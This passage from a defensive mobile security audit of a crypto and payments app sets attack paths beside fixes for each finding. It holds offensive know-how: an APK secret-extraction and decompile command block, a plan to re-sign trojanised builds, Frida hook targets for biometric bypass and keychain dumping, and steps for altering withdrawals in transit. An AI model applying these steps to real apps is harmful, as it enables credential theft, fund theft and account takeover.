1. With the API fully mapped (no pinning, no obfuscation), an attacker scripts direct calls with a captured bearer token, bypassing all client-side validation — amount limits, address format checks, the `checkValidationNumber` filter, and the fee calculation.
2. **OTP endpoints** (`/api/v1/Security/SendOTP/send`, `/api/v1/Customer/CustomerPhoneNumberUpdate`) have no client throttling; server-side limits must be confirmed.
3. **Referral endpoints** (`CustomerReferral/{customerType}`, `CustomerUpdate/{IdonthaveReferral}`) are an obvious bonus-farming target, especially from emulators ([H-04](#h-04--no-rootjailbreak-detection-or-device-attestation)).
4. **The Kommo secret** ([C-01](#c-01--live-kommo-hmac-secret-and-channel-credentials-hardcoded-in-shipped-javascript)) permits unlimited direct API abuse against the support channel with no per-user rate limit at all.
5. **Idempotency keys are recomputable** ([M-02](#m-02--idempotency-keys-use-a-non-cryptographic-hash-of-predictable-inputs)), so an attacker can pre-register a key to suppress a victim's genuine transaction.

**Risk impact.** SMS/email cost inflation, promotion abuse, support-channel abuse, targeted transaction suppression.

**Remediation.** Server-side rate limiting per user and per IP on all sensitive endpoints, with 429 responses (the client already handles 429 at [helpers/index.tsx:557](src/utils/helpers/index.tsx#L557)); server-side revalidation of every client-side check; random UUID idempotency keys; remove the client-held Kommo secret.

---

### VAPT-04 — Sensitive Data Exposure

**Severity:** 🔴 Critical · **Feasibility:** High · **Evidence:** [C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics), [C-02](#c-02--sentry-organisation-auth-token-committed-to-the-repository), [H-05](#h-05--redux-persist-encryption-transform-is-disabled), [H-08](#h-08--sentry-session-replay-and-pii-collection-enabled), [H-09](#h-09--no-screenshot--screen-recording-protection), [M-07](#m-07--financial-documents-written-to-world-readable-public-storage)

**Exposure inventory:**

| Data | Where it leaks | Route |
|---|---|---|
| Bearer + refresh token | Crashlytics attributes; Redux persist; Keychain (weak options) | C-07, H-05, H-11 |
| `sk` (PII encryption key) | Redux persist (unencrypted); Keychain (weak options) | H-05, H-11 |
| Full API request/response bodies | Crashlytics (×3) and Sentry | C-07 |
| Card PAN / CVV / PIN | On-screen (no capture protection); Crashlytics on error | H-09, C-07 |
| KYC/PII | Test Firebase project; Sumsub debug log; session replay when enabled | H-15, M-09, H-08 |
| Statements / bills | Public Downloads directory | M-07 |
| Registration PII | Weakly encrypted in transit (static key) | C-06 |
| Support conversations | Kommo, via leaked HMAC secret | C-01 |
| IP + geolocation | ipinfo.io, every launch | M-10 |

**Attack path (highest-yield chain).** Repo access → Sentry token ([C-02](#c-02--sentry-organisation-auth-token-committed-to-the-repository)) → read error events → extract bearer tokens and request bodies logged by [C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics) → replay tokens against the API → full account access. **No device access required at any step.**

**Risk impact.** Mass credential and PII disclosure; PCI-DSS and GDPR breach; notifiable incident.

**Remediation.** Rotate the Sentry token; strip tokens and bodies from telemetry; enable persist encryption; harden Keychain options; add `FLAG_SECURE`; move downloads to private storage. See the [Immediate Fixes](#151-immediate-fixes-0-72-hours) block.

---

### VAPT-05 — Man-in-the-Middle

**Severity:** 🟠 High · **Feasibility:** Medium · **Evidence:** [H-02](#h-02--network_security_configxml-exists-but-is-never-wired-into-the-manifest), [H-03](#h-03--no-certificate-pinning-on-either-platform), [H-10](#h-10--insecure-webview-configuration-in-the-2fa-withdrawal-flow), [C-06](#c-06--static-aes-128-key-used-as-both-key-and-iv-for-registration-encryption)

**Attack path.**
1. Place a CA on the target device (social engineering, MDM, malware, or root). Because the network security config is never applied ([H-02](#h-02--network_security_configxml-exists-but-is-never-wired-into-the-manifest)), user CAs are trusted; because there is no pinning ([H-03](#h-03--no-certificate-pinning-on-either-platform)), nothing else objects.
2. Proxy all traffic: bearer tokens, card operations, KYC uploads, withdrawal requests.
3. **Modify a withdrawal in flight** — change `walletAddress` in the `ExchangeTransaction/Withdraw/Crypto` body. Nothing signs the request; the idempotency key is recomputable ([M-02](#m-02--idempotency-keys-use-a-non-cryptographic-hash-of-predictable-inputs)).
4. **Decrypt registration payloads** using the static key from [C-06](#c-06--static-aes-128-key-used-as-both-key-and-iv-for-registration-encryption).
5. **Redirect the 2FA WebView** to exfiltrate the bearer token via [H-10](#h-10--insecure-webview-configuration-in-the-2fa-withdrawal-flow).
6. The spoofable `ipAddress` header ([M-10](#m-10--third-party-ip-geolocation-call-with-inverted-connectivity-logic)) means any backend geo-check based on it is also defeated.

**Risk impact.** Direct fund theft; full session compromise; PII disclosure.

**Remediation.** Wire in the network security config, add SPKI pinning with backup pins on both platforms, gate WebView navigation, remove client-asserted IP, and add server-side transaction signing so a modified withdrawal is detectable.

---

### VAPT-06 — Token Replay

**Severity:** 🟠 High · **Feasibility:** High · **Evidence:** [C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics), [H-11](#h-11--keychain-entries-stored-without-access-control-or-biometric-binding), [H-05](#h-05--redux-persist-encryption-transform-is-disabled), [M-15](#m-15--no-session-inactivity-timeout-or-foreground-re-authentication)

**Attack path.** The access token is a **bare bearer credential**:
```ts
config.headers.Authorization = `Bearer ${token}`;
```
with no proof-of-possession (no DPoP, no mTLS), no device binding, no request signing, and no nonce. Anyone holding the token can use it from anywhere.

Acquisition routes, in order of ease:
1. **Crashlytics/Sentry** — logged verbatim on every API error ([C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics)).
2. **Redux persist blob** — `userDetails` contains `accessToken` and `refreshToken` unencrypted ([H-05](#h-05--redux-persist-encryption-transform-is-disabled)).
3. **Keychain** — weak accessibility, no biometric binding ([H-11](#h-11--keychain-entries-stored-without-access-control-or-biometric-binding)); on iOS also present in iCloud Keychain and backups.
4. **MITM** ([VAPT-05](#vapt-05--man-in-the-middle)).
5. **WebView exfiltration** ([H-10](#h-10--insecure-webview-configuration-in-the-2fa-withdrawal-flow)).

The **refresh token** makes this indefinite: `checkAndRefreshToken` ([helpers/index.tsx:914](src/utils/helpers/index.tsx#L914)) mints new access tokens from it forever, and its failure path is commented out ([M-04](#m-04--silent-error-swallowing-throughout-the-codebase)) so revocation is not honoured proactively. There is no inactivity timeout ([M-15](#m-15--no-session-inactivity-timeout-or-foreground-re-authentication)) and no absolute session lifetime.

**Risk impact.** Persistent, undetectable account takeover.

**Remediation.** Short access-token TTL (≤15 min); refresh-token rotation with reuse detection (Auth0 supports this — enable it); device binding via a hardware-backed key ([H-14](#h-14--biometric-gate-is-client-side-navigation-only)); server-side anomaly detection on token use from new IPs/devices; honour revocation immediately; add absolute session lifetime.

---

### VAPT-07 — Reverse Engineering

**Severity:** 🔴 Critical · **Feasibility:** Trivial · **Evidence:** [C-08](#c-08--proguardr8-disabled-no-code-obfuscation), [C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore), [C-01](#c-01--live-kommo-hmac-secret-and-channel-credentials-hardcoded-in-shipped-javascript), [C-04](#c-04--hardcoded-production-issuer-jwt-and-authentication-bypass-fallback), [C-06](#c-06--static-aes-128-key-used-as-both-key-and-iv-for-registration-encryption)

**Attack path.**
```bash
unzip exchangapay.apk -d out
strings out/assets/index.android.bundle | grep -E '[a-f0-9]{40}|eyJ[A-Za-z0-9_-]+\.'
jadx -d src out/classes.dex          # full symbol names — R8 disabled
hermes-dec out/assets/index.android.bundle
```

Yields in minutes: the Kommo HMAC secret, the hardcoded JWT, the static AES key, all four Auth0 client IDs, the Sentry DSN, all API base URLs, the idempotency-key algorithm, and the complete client-side gating logic.

Then: patch the bundle, **re-sign with the publicly-known debug keystore** ([C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore)), and distribute a build the OS accepts as a legitimate update.

**Risk impact.** Every secret disclosed; trojanised builds indistinguishable from genuine ones; IP loss.

**Remediation.** Remove the secrets (the only real fix); enable R8 with proper keeps; obfuscate the JS layer; generate a real release keystore; enrol in Play App Signing; add server-side Play Integrity / App Attest so tampering is detectable regardless.

---

### VAPT-08 — Runtime Manipulation

**Severity:** 🟠 High · **Feasibility:** High · **Evidence:** [H-04](#h-04--no-rootjailbreak-detection-or-device-attestation), [H-14](#h-14--biometric-gate-is-client-side-navigation-only), [C-08](#c-08--proguardr8-disabled-no-code-obfuscation)

**Attack path.** With Frida on a rooted device — undetected, unobfuscated, debug-signed — an attacker hooks:

| Target | Effect |
|---|---|
| `ReactNativeBiometrics.simplePrompt` | App lock bypassed ([H-14](#h-14--biometric-gate-is-client-side-navigation-only)) |
| Redux `setUserInfo` / store | Force `isKYC: true`, `customerState: "Approved"`, `role: "Customer"` |
| `Keychain.getGenericPassword` | Dump tokens and `sk` |
| `encryptAES` / `decryptAES` | Log plaintext before/after crypto |
| `axios` interceptors | Read and modify every request/response |
| `validateCryptoAddress` | Force `true` (already returns `true` for most networks — [L-09](#l-09--miscellaneous-observations)) |

**Risk impact.** Every client-side control defeated simultaneously; credential extraction; transaction manipulation.

**Remediation.** Root/jailbreak and hook detection as a **signal**, server-side attestation as the **enforcement**. Move all security decisions server-side. Consider commercial RASP.

---

### VAPT-09 — Device Compromise / Local Attacker

**Severity:** 🟠 High · **Feasibility:** Medium · **Evidence:** [H-09](#h-09--no-screenshot--screen-recording-protection), [H-11](#h-11--keychain-entries-stored-without-access-control-or-biometric-binding), [M-07](#m-07--financial-documents-written-to-world-readable-public-storage), [M-15](#m-15--no-session-inactivity-timeout-or-foreground-re-authentication)

**Attack path — unattended unlocked device (the most common real-world scenario):**
1. No inactivity lock ([M-15](#m-15--no-session-inactivity-timeout-or-foreground-re-authentication)) → foregrounding the app lands in an authenticated session.
2. No step-up authentication → card PAN/CVV/PIN can be revealed and crypto withdrawal initiated without any challenge.
3. No screenshot protection ([H-09](#h-09--no-screenshot--screen-recording-protection)) → card data captured to the photo library.
4. Statements in public Downloads ([M-07](#m-07--financial-documents-written-to-world-readable-public-storage)) → readable without opening the app.
5. Keychain items readable without biometric ([H-11](#h-11--keychain-entries-stored-without-access-control-or-biometric-binding)) → tokens extracted for later use.

**Risk impact.** Complete account compromise from brief physical access to an unlocked device — no technical skill required for steps 1–4.

**Remediation.** Inactivity lock with biometric re-entry; biometric step-up before PAN/PIN reveal and withdrawal; `FLAG_SECURE`; private storage for documents; `BIOMETRY_CURRENT_SET` on the refresh token.

---

### VAPT-10 — Supply Chain

**Severity:** 🟠 High · **Feasibility:** Medium · **Evidence:** [H-12](#h-12--21-known-dependency-vulnerabilities-11-high-severity), [C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore), [§13](#13-devops--cicd-security)

**Attack path.**
1. **Build-machine compromise.** With CI deleted ([§13](#13-devops--cicd-security)), releases are built on developer workstations — which hold the signing key. A malicious npm package (or an exploit in the 11 High-severity build-time dependencies) executing during `npm install` or a Gradle build reaches the key.
2. **Unmaintained dependencies** — six packages with no upstream maintenance, two in security paths (`redux-persist-keychain-storage` handling all persisted credentials; `react-native-push-notification` requiring a local patch).
3. **`patch-package` patches** three libraries; a bad patch silently alters library behaviour.
4. **No SBOM, no dependency scanning, no lockfile-integrity gate in CI** (because there is no CI).

**Risk impact.** Signing-key theft; malicious code in a signed release; unpatchable vulnerabilities in abandoned libraries.

**Remediation.** Restore CI with `npm ci` + `npm audit --audit-level=high` as gates; move signing into CI with the key in a secrets manager, never on a workstation; replace unmaintained packages; generate an SBOM per release; add install-time malicious-package scanning.

---

### VAPT Findings Matrix

| ID | Attack | Severity | Feasibility | Primary evidence |
|---|---|---|---|---|
| VAPT-01 | Authentication bypass | 🔴 Critical | High | C-04, H-14 |
| VAPT-02 | Authorisation bypass | 🟠 High | Medium | C-04, H-13 |
| VAPT-03 | API abuse | 🟡 Medium | High | M-11, M-02, C-01 |
| VAPT-04 | Sensitive data exposure | 🔴 Critical | High | C-07, C-02, H-05 |
| VAPT-05 | Man-in-the-middle | 🟠 High | Medium | H-02, H-03, H-10 |
| VAPT-06 | Token replay | 🟠 High | High | C-07, H-11, M-15 |
| VAPT-07 | Reverse engineering | 🔴 Critical | Trivial | C-08, C-03 |
| VAPT-08 | Runtime manipulation | 🟠 High | High | H-04, H-14 |
| VAPT-09 | Device compromise | 🟠 High | Medium | H-09, H-11, M-15 |
| VAPT-10 | Supply chain | 🟠 High | Medium | H-12, C-03 |

---

## 7. API Security Audit

### 7.1 Architecture Overview

The app uses **`apisauce`** (an axios wrapper) with two configured instances in [src/utils/ApiService.ts](src/utils/ApiService.ts) plus **nine additional hardcoded clients** in [src/utils/api.tsx](src/utils/api.tsx), plus raw `axios` and `fetch` calls scattered across service modules. Twelve service modules in [src/services/](src/services/) wrap the endpoints.

### 7.2 Findings by Control

| Control | Status | Detail |
|---|---|---|
| **HTTPS enforcement** | ✅ Pass | All base URLs are `https://`. ATS `NSAllowsArbitraryLoads: false`; Android cleartext blocked by targetSdk 35 default. **But** `NSAllowsLocalNetworking: true` ([M-14](#m-14--ios-ats-permits-local-networking)) and the Sumsub stub hits `http://example.org` ([M-09](#m-09--sumsub-kyc-sdk-initialised-with-debug-mode-enabled)). |
| **Certificate pinning** | ❌ Fail | None on any client ([H-03](#h-03--no-certificate-pinning-on-either-platform)). |
| **Token handling** | ⚠️ Partial | Correctly read from Keychain per request via an interceptor ([ApiService.ts:162](src/utils/ApiService.ts#L162)) — good. But logged to telemetry ([C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics)), duplicated into Redux ([H-05](#h-05--redux-persist-encryption-transform-is-disabled)), and sent to a dynamic URL ([H-10](#h-10--insecure-webview-configuration-in-the-2fa-withdrawal-flow)). |
| **Refresh token security** | ⚠️ Partial | Rotation **is** handled correctly (`refreshed.refreshToken \|\| refresh_token` at [helpers/index.tsx:943](src/utils/helpers/index.tsx#L943)) — good. But failure is swallowed, revocation is not honoured, and there is no reuse detection. |
| **Authorisation validation** | ❌ Client-side only | All role/KYC/state gating in JS ([VAPT-02](#vapt-02--authorisation-bypass--privilege-escalation)). Server-side enforcement unverified. |
| **Rate limiting** | ⚠️ Server-dependent | No client throttling ([M-11](#m-11--no-client-side-rate-limiting-fixed-interval-chat-polling)). A `429` handler exists, suggesting some server-side limiting — must be confirmed per endpoint. |
| **Request validation** | ⚠️ Client-side only | Yup schemas exist for forms ([rigistationSchema.tsx](src/screens/onBoarding/rigistationSchema.tsx), [PersonalInfoSchema.tsx](src/screens/Profile/PersonalInfoSchema.tsx), etc.) — good practice for UX, but bypassable. `validateCryptoAddress` is **broken for most networks** ([L-09](#l-09--miscellaneous-observations)). |
| **Timeouts** | ❌ Fail | None configured on any client ([M-03](#m-03--no-request-timeouts-or-retry-policy)). |
| **Retry handling** | ❌ Fail | No retry, no backoff, no circuit breaker ([M-03](#m-03--no-request-timeouts-or-retry-policy)). |
| **Error exposure** | ⚠️ Partial | [`isErrorDispaly`](src/utils/helpers/index.tsx#L538) maps status codes to generic user messages — **good**, avoids leaking internals. But it exposes `data.title` verbatim for 409/422 and `data?.traceId` for 5xx, which may leak server detail. And full error bodies go to telemetry ([C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics)). |
| **Idempotency** | ⚠️ Weak | Implemented for 3 endpoints, but with a predictable non-cryptographic key that breaks legitimate repeat transactions ([M-02](#m-02--idempotency-keys-use-a-non-cryptographic-hash-of-predictable-inputs)). |
| **GraphQL** | N/A | REST only. |
| **API versioning** | ✅ Pass | Consistent `api/v1/` prefixing. |
| **Content-Type** | ✅ Pass | Set explicitly per client (`application/json` / `multipart/form-data`). |

### 7.3 Endpoint Inventory (from service modules)

| Domain | Representative endpoints | Sensitivity |
|---|---|---|
| Auth | `Registration/App/Exchange`, `Common/Login`, `Common/Logout` | High |
| Security | `Customer/ChangePWD`, `Security/ResetPWD`, `Security/SendOTP/send`, `Security/PhoneVerification/{code}` | Critical |
| Cards | `getcardPin`, card details, freeze, replace, report loss, apply | Critical (PCI) |
| Crypto | `ExchangeTransaction/Withdraw/Crypto`, `ExchangeTransaction/Deposit/TopUp`, `Common/TwoFactorAuthenticationURL` | Critical |
| KYC | `sumsubAccessToken`, `sumsubCompleted`, KYC info submission | High (PII) |
| Profile | `Customer/CustomerDetailsUpdate`, `CustomerPhoneNumberUpdate`, address book | High (PII) |
| Notifications | `Notification/SaveUserToken` | Medium |
| Market | CoinGecko `api/v3/` | Low |

### 7.4 Recommendations

1. **Consolidate to one client.** Nine base URLs across three HTTP libraries makes every cross-cutting control (timeout, retry, pinning, scrubbing) a nine-place change. Route everything through the `ApiService` instance.
2. **Add timeouts and a retry policy** ([M-03](#m-03--no-request-timeouts-or-retry-policy)) — retry only idempotent operations.
3. **Add certificate pinning** ([H-03](#h-03--no-certificate-pinning-on-either-platform)) once consolidated.
4. **Scrub telemetry** ([C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics)).
5. **Verify server-side**, with a backend review or penetration test:
   - Authorisation on every endpoint derived from the token, not from parameters.
   - Rate limiting on OTP, login, password change, withdrawal, PIN reveal.
   - Idempotency key enforcement with payload comparison.
   - KYC/AML state re-checked on every financial operation.
   - No sensitive data in responses beyond what the screen needs (e.g. does `getcardPin` return more than the PIN?).
6. **Add request signing** for high-value operations — an HMAC or hardware-key signature over `(method, path, body, timestamp, nonce)` verified server-side, which defeats both replay ([VAPT-06](#vapt-06--token-replay)) and MITM tampering ([VAPT-05](#vapt-05--man-in-the-middle)).
7. **Reduce error detail** — stop surfacing `data.title` and `traceId` directly to users; log the trace ID and show a generic message with a reference code.

---

## 8. Android Security Review

### 8.1 Configuration Assessment

| Control | Current | Verdict |
|---|---|---|
| `minSdkVersion` | 24 (Android 7.0) | ⚠️ Low — API 24 lacks modern Keystore guarantees. Consider raising to 26+ (StrongBox availability starts at 28). |
| `targetSdkVersion` | 35 | ✅ Good — held at 35 deliberately, documented in [build.gradle](android/build.gradle#L7-L9). Note Play requires 35 as of Aug 2025; plan for 36. |
| `compileSdkVersion` | 36 | ✅ Good |
| `allowBackup` | `false` | ✅ **Good** — blocks `adb backup` extraction |
| `dataExtractionRules` | Absent | ⚠️ Add for API 31+ device-transfer blocking |
| `usesCleartextTraffic` | `true` in **debug** manifest only | ✅ Correctly scoped |
| `networkSecurityConfig` | File exists, **not referenced** | ❌ **[H-02](#h-02--network_security_configxml-exists-but-is-never-wired-into-the-manifest)** |
| `exported` components | Only `MainActivity` (launcher — required) | ✅ Good; **but** review the merged manifest for library-contributed components ([M-13](#m-13--no-deep-link-or-universal-link-configuration)) |
| `launchMode` | `singleTask` | ⚠️ Requires careful `onNewIntent` handling if deep links are added |
| ProGuard/R8 | **Disabled**, empty rules | ❌ **[C-08](#c-08--proguardr8-disabled-no-code-obfuscation)** |
| Release signing | **Debug keystore** | ❌ **[C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore)** |
| Permissions | 8 declared; `RECORD_AUDIO`, `WRITE_EXTERNAL_STORAGE` questionable | ⚠️ **[M-06](#m-06--over-broad-android-permissions)** |
| `AD_ID` | Explicitly removed | ✅ **Good** privacy hygiene |
| Root detection | None | ❌ **[H-04](#h-04--no-rootjailbreak-detection-or-device-attestation)** |
| Play Integrity | None | ❌ **[H-04](#h-04--no-rootjailbreak-detection-or-device-attestation)** |
| `FLAG_SECURE` | None | ❌ **[H-09](#h-09--no-screenshot--screen-recording-protection)** |
| Keystore usage | Via `react-native-keychain`, default options | ⚠️ **[H-11](#h-11--keychain-entries-stored-without-access-control-or-biometric-binding)** |
| Firebase config | Committed, test project | ⚠️ **[H-15](#h-15--firebase-configuration-files-committed-pointing-at-the-test-project)** |
| New Architecture | `newArchEnabled=true`, Hermes on | ✅ Good |
| Jetifier | `enableJetifier=true` | ⚠️ Retained for 3 pre-AndroidX libs ([L-02](#l-02--duplicated-and-redundant-dependencies)) |
| Architectures | `armeabi-v7a,arm64-v8a,x86,x86_64` | ⚠️ x86/x86_64 only needed for emulators — dropping them from release cuts APK size substantially |

### 8.2 APK Reverse-Engineering Exposure

With R8 disabled and debug signing, the APK offers:
- Full Java/Kotlin symbol names (`jadx` produces near-source output)
- Unobfuscated Hermes bundle with all string literals intact
- A known signing key permitting repackaging
- No integrity self-check, no anti-debug, no anti-hook

**This is the single highest-leverage area to fix** — it converts several theoretical findings into trivial ones.

### 8.3 Android Recommendations (prioritised)

1. **Generate a real release keystore; enrol in Play App Signing** ([C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore)).
2. **Enable R8 with proper keeps; test the release build end to end** ([C-08](#c-08--proguardr8-disabled-no-code-obfuscation)).
3. **Add `android:networkSecurityConfig`** and extend it with pinning ([H-02](#h-02--network_security_configxml-exists-but-is-never-wired-into-the-manifest)/[H-03](#h-03--no-certificate-pinning-on-either-platform)).
4. **Add `FLAG_SECURE`** in `MainActivity.onCreate` ([H-09](#h-09--no-screenshot--screen-recording-protection)).
5. **Integrate Play Integrity** with server-side verdict verification ([H-04](#h-04--no-rootjailbreak-detection-or-device-attestation)).
6. **Harden Keychain options** ([H-11](#h-11--keychain-entries-stored-without-access-control-or-biometric-binding)).
7. **Trim permissions**; add `maxSdkVersion` bounds; add `dataExtractionRules` ([M-06](#m-06--over-broad-android-permissions)).
8. **Add product flavours** for dev/tst/prod with per-flavour `google-services.json` ([C-05](#c-05-getallenvdata-hard-returns-the-test-environment-for-every-build)/[H-15](#h-15--firebase-configuration-files-committed-pointing-at-the-test-project)).
9. **Drop x86 ABIs from release builds**; consider an App Bundle (`.aab`) for per-device delivery.
10. **Review the merged release manifest** for unexpected exported components.

---

## 9. iOS Security Review

### 9.1 Configuration Assessment

| Control | Current | Verdict |
|---|---|---|
| ATS `NSAllowsArbitraryLoads` | `false` | ✅ **Good** |
| ATS `NSAllowsLocalNetworking` | `true` | ⚠️ **[M-14](#m-14--ios-ats-permits-local-networking)** — should be Debug-only |
| ATS `NSPinnedDomains` | Absent | ❌ **[H-03](#h-03--no-certificate-pinning-on-either-platform)** |
| `aps-environment` | `development` | ⚠️ **[M-08](#m-08--ios-entitlements-set-to-development-aps-environment)** — breaks production push |
| `CFBundleURLTypes` | **Absent** | ⚠️ **[M-13](#m-13--no-deep-link-or-universal-link-configuration)** — Auth0 callback may be broken |
| Associated Domains | Absent | ⚠️ No Universal Links |
| Data Protection entitlement | Absent | ⚠️ Add `NSFileProtectionComplete` |
| App Attest / DeviceCheck | Absent | ❌ **[H-04](#h-04--no-rootjailbreak-detection-or-device-attestation)** |
| Keychain access control | Default (`WhenUnlocked`, syncable) | ❌ **[H-11](#h-11--keychain-entries-stored-without-access-control-or-biometric-binding)** |
| Jailbreak detection | None | ❌ **[H-04](#h-04--no-rootjailbreak-detection-or-device-attestation)** |
| Snapshot protection | None | ❌ **[H-09](#h-09--no-screenshot--screen-recording-protection)** |
| `PrivacyInfo.xcprivacy` | Present, well-formed | ✅ **Good** — declares UserDefaults, FileTimestamp, SystemBootTime, DiskSpace API usage with valid reason codes; `NSPrivacyTracking: false` |
| `NSPrivacyCollectedDataTypes` | **Empty array** | ❌ **Incorrect** — the app collects email, phone, name, DOB, payment info, and identifiers. This manifest will fail App Review scrutiny and misrepresents data collection. |
| Purpose strings | Camera, FaceID, Location, Microphone, PhotoLibrary — all present and descriptive | ✅ **Good** |
| `NSLocationWhenInUseUsageDescription` | Declared, **no code requests location** | ⚠️ Remove or implement ([M-10](#m-10--third-party-ip-geolocation-call-with-inverted-connectivity-logic)) |
| `UIBackgroundModes` | `remote-notification`, `fetch` | ✅ Reasonable |
| New Architecture | `RCTNewArchEnabled: true` | ✅ Good |
| Bundle loading | `Bundle.main.url(forResource: "main", withExtension: "jsbundle")` in Release | ✅ Correct |
| Orientation | Portrait + both landscape | ⚠️ Confirm landscape is tested |

### 9.2 Notable iOS-Specific Observations

**`AppDelegate.swift` bundle URL bug.** In `bundleURL()`:
```swift
override func bundleURL() -> URL? {
#if DEBUG
    RCTBundleURLProvider.sharedSettings().jsBundleURL(forBundleRoot: "index")
#else
    Bundle.main.url(forResource: "main", withExtension: "jsbundle")
#endif
}
```
Neither branch has an explicit `return`. Swift's implicit-return applies only to single-expression bodies — with `#if`/`#else` this compiles because each branch is a single expression after preprocessing, so it works, but it is fragile and should be written with explicit `return` statements for clarity.

**No jailbreak detection** means the standard checks (presence of `/Applications/Cydia.app`, `/bin/bash`, `/usr/sbin/sshd`; ability to write outside the sandbox; `fork()` success; suspicious dylibs in `_dyld_image_count`) are all absent.

**Keychain items are syncable by default**, so tokens and `sk` reach iCloud Keychain and encrypted backups ([H-11](#h-11--keychain-entries-stored-without-access-control-or-biometric-binding)).

### 9.3 iOS Recommendations (prioritised)

1. **Fix `NSPrivacyCollectedDataTypes`** — declare every collected data type (email, phone, name, DOB, payment info, device ID, crash data, product interaction) with linkage and tracking flags. This is an App Store submission requirement and the current empty array is a misrepresentation.
2. **Set `aps-environment: production`** for Release via per-configuration entitlements ([M-08](#m-08--ios-entitlements-set-to-development-aps-environment)).
3. **Verify/add `CFBundleURLTypes`** for the Auth0 callback ([M-13](#m-13--no-deep-link-or-universal-link-configuration)) — test the login flow end-to-end on a device.
4. **Add `NSPinnedDomains`** ([H-03](#h-03--no-certificate-pinning-on-either-platform)).
5. **Remove `NSAllowsLocalNetworking`** from Release ([M-14](#m-14--ios-ats-permits-local-networking)).
6. **Add snapshot blurring and `UIScreen.isCaptured` observation** ([H-09](#h-09--no-screenshot--screen-recording-protection)).
7. **Harden Keychain**: `WHEN_UNLOCKED_THIS_DEVICE_ONLY` + `BIOMETRY_CURRENT_SET_OR_DEVICE_PASSCODE` ([H-11](#h-11--keychain-entries-stored-without-access-control-or-biometric-binding)).
8. **Add `NSFileProtectionComplete`** data-protection entitlement.
9. **Implement App Attest** ([H-04](#h-04--no-rootjailbreak-detection-or-device-attestation)).
10. **Add jailbreak detection** as a risk signal.
11. **Remove the unused location purpose string** or implement location collection properly.
12. **Add per-configuration `GoogleService-Info.plist`** ([H-15](#h-15--firebase-configuration-files-committed-pointing-at-the-test-project)).

---
## 10. React Native Performance Audit

### 10.1 Performance Posture Summary

| Area | Status | Notes |
|---|---|---|
| Engine | ✅ Good | Hermes enabled, New Architecture (Fabric + TurboModules) on |
| Native crypto | ✅ **Excellent** | Migrated `crypto-js` → `react-native-quick-crypto`; decrypt memoisation cache added |
| Animations | ✅ Good | Reanimated 4.5.3 + Worklets 0.11.3 (UI-thread animations) |
| Screens | ✅ Good | `enableScreens()` called; native-stack navigator |
| Startup | ❌ **Poor** | ~120 screens statically imported into one navigator |
| Bundle size | ❌ **Poor** | 3 chart libs, 2 date libs, 11 redundant packages |
| List virtualisation | ❌ **Poor** | Zero tuning props across 12 `FlatList`s |
| Memoisation | ⚠️ Sparse | 5 `useMemo` vs 53,261 LOC; 38 `useCallback`; 45 `React.memo` |
| Component size | ❌ Poor | Three screens over 1,800 lines |
| Network efficiency | ⚠️ Mixed | Fixed-interval polling; redundant effect-triggered calls |
| Type safety | ❌ Poor | 1,081 `any` — blocks compiler optimisation and hides re-render causes |

---

### P-01 — All ~120 Screens Statically Imported at Startup

**Severity:** 🟠 High (startup time, memory) · **File:** [src/navigation/AppContainer.tsx:1-104](src/navigation/AppContainer.tsx#L1-L104)

**Technical explanation.** `AppContainer.tsx` opens with **~100 static import statements**, pulling every screen module into the initial bundle evaluation:

```tsx
import SplashScreen from "../screens/SplashScreen";
import SendCryptoDetails from "../screens/Crypto/sendCryptoDetails";      // 874 lines
import PdfExcelComponent from "../screens/Statement/Index";
import Dashboard from "../screens/AccountDashboard/index";
import EditProfile from "../screens/Profile/editprofile";                  // 1,824 lines
import AddKycInfomation from "../screens/Profile/addKycInfomation";        // 2,212 lines
// … ~95 more
```

Every one of these modules — plus their transitive imports of `victory-native`, `react-native-chart-kit`, `moment`, `lodash`, the SVG assets, and the Sumsub SDK — is parsed and evaluated **before the first frame renders**. A user who only ever opens the dashboard pays the full cost of the KYC, card-application, statement, chat, and case-management screens.

Measured proxy: `src/screens/` alone is ~40,000 LOC of the 53,261 total, essentially all of it reachable from this one file.

**Impact.** Slow cold start (particularly on low-end Android), elevated baseline memory, and a larger initial Hermes bytecode parse.

**Recommended fix.**
1. **Lazy-load non-critical screens** with `React.lazy` + `Suspense`:
   ```tsx
   const AddKycInfomation = React.lazy(() => import("../screens/Profile/addKycInfomation"));
   const EditProfile      = React.lazy(() => import("../screens/Profile/editprofile"));

   <Stack.Screen name="addKycInfomation">
     {(props) => (
       <Suspense fallback={<ScreenLoader />}>
         <AddKycInfomation {...props} />
       </Suspense>
     )}
   </Stack.Screen>
   ```
   Keep eagerly imported only: `SplashScreen`, `Dashboard`, `NoInternet`, `SomethingWentWrong`, and the onboarding entry point.
2. **Split the navigator** into feature-scoped nested navigators (auth, dashboard, cards, crypto, profile, support), each lazily loaded — this also improves readability of a file that currently has 104 lines of imports before any logic.
3. **Enable Metro's `inlineRequires`** (on by default in RN 0.83's preset, but verify) so module bodies are evaluated on first use rather than at bundle load.
4. **Measure before and after** with `RNBootSplash.hide()` timing or Flipper/Perfetto, so the improvement is quantified rather than assumed.

---

### P-02 — No FlatList Virtualisation Tuning

**Severity:** 🟡 Medium · **Scope:** 12 files using `FlatList`

**Technical explanation.** Across all 12 `FlatList` usages:

| Prop | Occurrences |
|---|---|
| `keyExtractor` | 14 ✅ |
| `getItemLayout` | **0** ❌ |
| `initialNumToRender` | **0** ❌ |
| `maxToRenderPerBatch` | **0** ❌ |
| `windowSize` | **0** ❌ |
| `updateCellsBatchingPeriod` | **0** ❌ |
| `removeClippedSubviews` | 1 |

`keyExtractor` being present everywhere is good and prevents the worst re-render behaviour. But without `getItemLayout`, `FlatList` must measure every row, which prevents accurate scroll-position estimation and causes blank cells during fast scrolling. The defaults (`initialNumToRender: 10`, `windowSize: 21`, `maxToRenderPerBatch: 10`) render roughly 21 screens' worth of content in memory.

